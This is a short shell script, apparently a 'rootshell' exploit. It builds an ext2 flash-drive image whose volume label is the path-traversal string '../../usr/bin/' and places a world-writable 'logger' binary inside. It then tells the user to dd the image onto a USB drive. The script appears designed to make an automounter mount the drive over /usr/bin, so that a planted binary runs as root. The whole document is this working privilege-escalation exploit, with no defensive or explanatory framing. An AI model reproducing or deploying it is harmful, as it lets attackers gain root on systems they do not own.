#requires e2tools, and genext2fs

#make 8mb image
genext2fs -L "../../usr/bin/" -B 1024 -b 8192 rootshell.ext2
e2cp -P 777 logger rootshell.ext2:/
echo "======================================"
echo "Rootshell file system prepared. Insert flash drive and do:"
echo "$ sudo dd if=./rootshell.ext2 of=/dev/sd#"
echo "Make sure to replace sd# with your actuall flash drive and don't overwrite your system drive!!!"
echo "======================================"
